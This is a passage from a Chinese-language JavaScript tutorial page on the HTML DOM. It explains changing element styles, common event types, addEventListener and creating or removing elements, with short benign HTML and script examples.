class="line">document.getElementById(&quot;image&quot;).src&#x3D;&quot;landscape.jpg&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="DOM-CSS（改变CSS）"><a href="#DOM-CSS（改变CSS）" class="headerlink" title="DOM CSS（改变CSS）"></a>DOM CSS（改变CSS）</h3><p>HTML DOM 允许 JavaScript 改变 HTML 元素的样式。<br><strong>改变HTML样式</strong><br>如需改变 HTML 元素的样式，请使用这个语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(id).style.property&#x3D;新样式</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">改变&lt;p&gt;元素的样式：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;Hello World!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;Hello World!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;p2&quot;).style.color&#x3D;&quot;blue&quot;;</span><br><span class="line">document.getElementById(&quot;p2&quot;).style.fontFamily&#x3D;&quot;Arial&quot;;</span><br><span class="line">document.getElementById(&quot;p2&quot;).style.fontSize&#x3D;&quot;larger&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;p&gt;以上段落通过脚本修改。&lt;&#x2F;p&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><strong>使用事件</strong><br>HTML DOM 允许我们通过触发事件来执行代码。</p><p>比如以下事件：</p><ul><li>元素被点击。</li><li>页面加载完成。</li><li>输入框被修改</li><li>……</li></ul><p>本例改变了 id=”id1” 的 HTML 元素的样式，当用户点击按钮时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 id&#x3D;&quot;id1&quot;&gt;我的标题 1&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;button&quot;</span><br><span class="line">onclick&#x3D;&quot;document.getElementById(&#39;id1&#39;).style.color&#x3D;&#39;red&#39;&quot;&gt;</span><br><span class="line">按钮&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="DOM-事件"><a href="#DOM-事件" class="headerlink" title="DOM 事件"></a>DOM 事件</h3><h4 id="事件概述"><a href="#事件概述" class="headerlink" title="事件概述"></a>事件概述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">事件三要素：</span><br><span class="line">1.事件源：被监听的html元素（就是这个事件加给谁），就是某个（某些）html标签</span><br><span class="line">2.事件类型：某类动作，例如点击事件，移入移除事件，敲击键盘事件等</span><br><span class="line">3.执行指令：事件触发后需要执行的代码，一般使用函数进行封装</span><br><span class="line">语法格式：事件源.事件类型&#x3D;执行指令</span><br></pre></td></tr></table></figure><h4 id="js事件写法"><a href="#js事件写法" class="headerlink" title="js事件写法"></a>js事件写法</h4><p>事件:  可以理解为:一件事</p><ul><li>以<strong>on前缀开始</strong>   <strong>on</strong>事件名<br>事件<strong>不会自己执行,需要触发</strong>(事件要被触发才可以执行)</li></ul><p><strong>事件三要素:</strong></p><ul><li>事件对象</li><li>事件名称</li><li>事件处理函数</li></ul><h4 id="js中事件的书写的三种位置"><a href="#js中事件的书写的三种位置" class="headerlink" title="js中事件的书写的三种位置"></a>js中事件的书写的三种位置</h4><p>1.1 行内注册事件<br>1.1 在行内直接写函数，嵌入式(传统的事件绑定方法）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;box&quot; onclick&#x3D;&quot;&#123;alert(245)&#125;&quot;&gt;&lt;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick&#x3D;&#39;alert(&quot;hello&quot;)&#39;&gt;点击按钮&lt;&#x2F;button&gt;</span><br><span class="line">等等</span><br><span class="line"></span><br><span class="line">优点:简单易懂</span><br><span class="line">    缺点:将JavaScript代码与html代码混为一体,不利于多人协作开发</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.2 或者在行内调用已经写好的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;box&quot; onclick&#x3D;&quot;fun()&quot;&gt;&lt;div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function fun()&#123;</span><br><span class="line">    alert(234);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>2 页面内注册事件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; html 页面</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;box&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&#x2F;&#x2F; js结构</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var div &#x3D; document.querySelector(&#39;.box&#39;);</span><br><span class="line">    div.addEventListener(&#39;click&#39;, function() &#123;</span><br><span class="line">        alert(&#39;hello world&#39;);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>3 引入外部的js实现注册</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 引入外部的js</span><br><span class="line"> &lt;script src&#x3D;&quot;.&#x2F;js&#x2F;unimportant.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>拓展：</strong><br>在W3C标准中：事件可以写在行内，但是因为结构和行为要分离，所以我们一半情况下用JS的方法来绑定事件，只有在极少数情况下，才将事件写在行内。<br>行内事件又叫：HTML事件处理程序，html事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">js事件：</span><br><span class="line">事件的绑定方法：</span><br><span class="line"></span><br><span class="line">浏览器中的节点(节点).on事件名 &#x3D; function()&#123; 要干什么？(放在浏览器中，不执行，当事件发生的时候再执行) &#125;</span><br><span class="line"></span><br><span class="line">在以下实例中，按钮元素中添加了 onclick 属性 (并加上代码):</span><br><span class="line">&lt;button onclick&#x3D;&quot;getElementById(&#39;demo&#39;).innerHTML&#x3D;Date()&quot;&gt;现在的时间是?&lt;&#x2F;button&gt;</span><br><span class="line">以上实例中，JavaScript 代码将修改 id&#x3D;&quot;demo&quot; 元素的内容。</span><br></pre></td></tr></table></figure><p>总结：事件就是给浏览器定义一个预处理函数，当事件触发的时候，执行函数，这就是事件。在这里插入代码片</p><h4 id="常用的事件："><a href="#常用的事件：" class="headerlink" title="常用的事件："></a>常用的事件：</h4><table><thead><tr><th align="center">事件名</th><th align="center">表现描述</th></tr></thead><tbody><tr><td align="center"><strong>onload</strong></td><td align="center"><strong>某个页面或图像被完成加载</strong></td></tr><tr><td align="center"><strong>onsubmit</strong></td><td align="center"><strong>当表单提交时触发该事件—注意事件源是表单form</strong></td></tr><tr><td align="center"><strong>onclick</strong></td><td align="center"><strong>鼠标点击某个对象</strong></td></tr><tr><td align="center">ondblclick</td><td align="center">鼠标双击某个对象</td></tr><tr><td align="center"><strong>onblur</strong></td><td align="center"><strong>元素失去焦点，通常针对表单元素</strong></td></tr><tr><td align="center"><strong>onfocus</strong></td><td align="center">元素获得焦点，通常针对表单元素</td></tr><tr><td align="center"><strong>onchange</strong></td><td align="center"><strong>用户改变域的内容，通常针对表单元素</strong></td></tr><tr><td align="center">onkeydown</td><td align="center">某个键盘的键被按下</td></tr><tr><td align="center">onkeypress</td><td align="center">某个键盘的键被按下或按住</td></tr><tr><td align="center">onkeyup</td><td align="center">某个键盘的键被松开</td></tr><tr><td align="center">onmousedown</td><td align="center">某个鼠标键被按下</td></tr><tr><td align="center">onmouseup</td><td align="center">某个鼠标键被松开</td></tr><tr><td align="center"><strong>onmouseove</strong>r</td><td align="center"><strong>鼠标被移到某元素上</strong></td></tr><tr><td align="center"><strong>onmouseout</strong></td><td align="center"><strong>鼠标从某元素移开</strong></td></tr><tr><td align="center">onmousemove</td><td align="center">鼠标被移动</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">事件的分类：</span><br><span class="line">鼠标事件：</span><br><span class="line">    onclick        单击</span><br><span class="line">    ondblclick     双击</span><br><span class="line">    onmousedown    按下</span><br><span class="line">    onmouseup      抬起</span><br><span class="line">    onmousemove    移动</span><br><span class="line">    onmouseover    放上去        onmouseenter    进入</span><br><span class="line">    onmouseout     离开          onmouseleave    离开</span><br><span class="line"></span><br><span class="line">    onmousewheel   滚轮事件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    onmouseenter和onmouseleave不支持事件冒泡</span><br><span class="line">    </span><br><span class="line">表单事件：</span><br><span class="line">    onsubmit       提交</span><br><span class="line">    onfocus        获得焦点</span><br><span class="line">    onblur         失去焦点</span><br><span class="line">    onchange       改变文本区域的内容</span><br><span class="line"></span><br><span class="line">页面事件：</span><br><span class="line">    onload         加载完成</span><br><span class="line"></span><br><span class="line">键盘事件：</span><br><span class="line">等等</span><br></pre></td></tr></table></figure><h5 id="onclick-事件"><a href="#onclick-事件" class="headerlink" title="onclick 事件"></a>onclick 事件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">实例onclick，当用户在 &lt;h1&gt; 元素上点击时，会改变其内容：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 onclick&#x3D;&quot;this.innerHTML&#x3D;&#39;Ooops!&#39;&quot;&gt;点击文本!&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>HTML事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">向 button 元素分配 onclick 事件</span><br><span class="line">名为 displayDate 的函数将在按钮被点击时执行。</span><br><span class="line"></span><br><span class="line">&lt;button onclick&#x3D;&quot;displayDate()&quot;&gt;点这里&lt;&#x2F;button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function displayDate()&#123;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML&#x3D;Date();</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h5 id="onload和onunload-事件"><a href="#onload和onunload-事件" class="headerlink" title="onload和onunload 事件"></a>onload和onunload 事件</h5><p>onload 和 onunload 事件会在用户进入或离开页面时被触发。<br>onload 事件可用于检测访问者的浏览器类型和浏览器版本，并基于这些信息来加载网页的正确版本。<br>onload 和 onunload 事件可用于处理 cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body onload&#x3D;&quot;checkCookies()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function checkCookies()&#123;</span><br><span class="line">if (navigator.cookieEnabled&#x3D;&#x3D;true)&#123;</span><br><span class="line">alert(&quot;Cookies 可用&quot;)</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">alert(&quot;Cookies 不可用&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;p&gt;弹窗-提示浏览器 cookie 是否可用。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><h5 id="onchange-事件"><a href="#onchange-事件" class="headerlink" title="onchange 事件"></a>onchange 事件</h5><p>onchange 事件常结合对输入字段的验证来使用。</p><p>下面是一个如何使用 onchange 的例子。当用户改变输入字段的内容时，会调用 upperCase() 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction()&#123;</span><br><span class="line">var x&#x3D;document.getElementById(&quot;fname&quot;);</span><br><span class="line">x.value&#x3D;x.value.toUpperCase();</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">输入你的名字: &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;fname&quot; onchange&#x3D;&quot;myFunction()&quot;&gt;</span><br><span class="line">&lt;p&gt;当你离开输入框后，函数将被触发，将小写字母转为大写字母。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><h5 id="onmouseover-和-onmouseout-事件"><a href="#onmouseover-和-onmouseout-事件" class="headerlink" title="onmouseover 和 onmouseout 事件"></a>onmouseover 和 onmouseout 事件</h5><p>onmouseover 和 onmouseout 事件可用于在用户的鼠标移至 HTML 元素上方或移出元素时触发函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div onmouseover&#x3D;&quot;mOver(this)&quot; onmouseout&#x3D;&quot;mOut(this)&quot; style&#x3D;&quot;background-color:#D94A38;width:120px;height:20px;padding:40px;&quot;&gt;Mouse Over Me&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function mOver(obj)&#123;</span><br><span class="line">obj.innerHTML&#x3D;&quot;Thank You&quot;</span><br><span class="line">&#125;</span><br><span class="line">function mOut(obj)&#123;</span><br><span class="line">obj.innerHTML&#x3D;&quot;Mouse Over Me&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>案列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;事件&lt;&#x2F;title&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        &#x2F;&#x2F; 窗口 : window 对象提供了一个事件类型  onload 页面加载完成事件.</span><br><span class="line">        &#x2F;&#x2F; 事件源 : window    事件类型 : 页面加载完成事件 (onload)  执行指令: 就是赋值的 function 函数.</span><br><span class="line">        window.onload &#x3D; function () &#123;</span><br><span class="line"> </span><br><span class="line">            &#x2F;&#x2F; 获取页面的 btn 按钮</span><br><span class="line">            var btn &#x3D; document.getElementById(&quot;btn&quot;);</span><br><span class="line">            &#x2F;&#x2F; alert(btn);</span><br><span class="line"> </span><br><span class="line">            &#x2F;&#x2F; 给 btn 按钮绑定一个事件 (单击事件 onclick)</span><br><span class="line">            &#x2F;&#x2F; 事件源 : btn按钮    事件类型 : 单击事件 (onclick)  执行指令: 就是赋值的 function 函数.</span><br><span class="line">            btn.onclick &#x3D; function () &#123;</span><br><span class="line">                alert(&quot;恭喜你, 中了 500 万!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;button id&#x3D;&quot;btn&quot;&gt;按钮&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="DOM-Eventlistener"><a href="#DOM-Eventlistener" class="headerlink" title="DOM Eventlistener"></a>DOM Eventlistener</h3><h4 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener() 方法"></a>addEventListener() 方法</h4><p><strong>语法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.addEventListener(event, function, useCapture);</span><br></pre></td></tr></table></figure><p>第一个参数是事件的类型 (如 “click” 或 “mousedown”).</p><p>第二个参数是事件触发后调用的函数。</p><p>第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">在用户点击按钮时触发监听事件：</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;该实例使用 addEventListener() 方法在按钮中添加点击事件。 &lt;&#x2F;p&gt;</span><br><span class="line">&lt;button id&#x3D;&quot;myBtn&quot;&gt;点我&lt;&#x2F;button&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, displayDate);</span><br><span class="line">function displayDate() &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML &#x3D; Date();</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><h4 id="removeEventListener-方法"><a href="#removeEventListener-方法" class="headerlink" title="removeEventListener() 方法"></a>removeEventListener() 方法</h4><p>removeEventListener() 方法移除由 addEventListener() 方法添加的事件句柄</p><h3 id="DOM-元素"><a href="#DOM-元素" class="headerlink" title="DOM 元素"></a>DOM 元素</h3><h4 id="创建新的-HTML-元素-节点-appendChild"><a href="#创建新的-HTML-元素-节点-appendChild" class="headerlink" title="创建新的 HTML 元素 (节点) - appendChild()"></a>创建新的 HTML 元素 (节点) - appendChild()</h4><p>要创建新的 HTML 元素 (节点)需要先创建一个元素，然后在已存在的元素中添加它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var para &#x3D; document.createElement(&quot;p&quot;);</span><br><span class="line">var node &#x3D; document.createTextNode(&quot;这是一个新的段落。&quot;);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 添加新元素到尾部</span><br><span class="line">var element &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">element.appendChild(para);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加新元素到开始位置，可以使用insertBefore方法</span><br><span class="line">var element &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br><span class="line">element.insertBefore(para, child);</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>实例解析<br>以下代码是用于创建 <p> 元素:</p><p>var para = document.createElement(“p”);<br>为 <p> 元素创建一个新的文本节点：</p><p>var node = document.createTextNode(“这是一个新的段落。”);<br>将文本节点添加到 <p> 元素中：</p><p>para.appendChild(node);<br>最后，在一个已存在的元素中添加 p 元素。</p><p>查找已存在的元素：</p><p>var element = document.getElementById(“div1”);<br>添加到已存在的元素中:</p><p>element.appendChild(para);</p><h4 id="移除已存在的元素"><a href="#移除已存在的元素" class="headerlink" title="移除已存在的元素"></a>移除已存在的元素</h4><p>要移除一个元素，你需要知道该元素的父元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var parent &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br><span class="line">parent.removeChild(child);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>实例解析<br>HTML 文档中 <div> 元素包含两个子节点 (两个 <p> 元素):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;&#96;</span><br></pre></td></tr></table></figure><p>查找 id=”div1” 的元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var parent &#x3D; document.getElementById(&quot;div1&quot;);</span><br></pre></td></tr></table></figure><p>查找 id=”p1” 的 <code>&lt;p&gt;</code> 元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br></pre></td></tr></table></figure><p>从父元素中移除子节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.removeChild(child);</span><br></pre></td></tr></table></figure><p>注意：    如果能够在不引用父元素的情况下删除某个元素，就太好了。<br>不过很遗憾。DOM 需要清楚您需要删除的元素，以及它的父元素。<br>以下代码是已知要查找的子元素，然后查找其父元素，再删除这个子元素（删除节点必须知道父节点）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br><span class="line">child.parentNode.removeChild(child);</span><br></pre></td></tr></table></figure><h4 id="替换-HTML-元素-replaceChild"><a href="#替换-HTML-元素-replaceChild" class="headerlink" title="替换 HTML 元素 - replaceChild()"></a>替换 HTML 元素 - replaceChild()</h4><p>我们可以使用 replaceChild() 方法来替换 HTML DOM 中的元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div 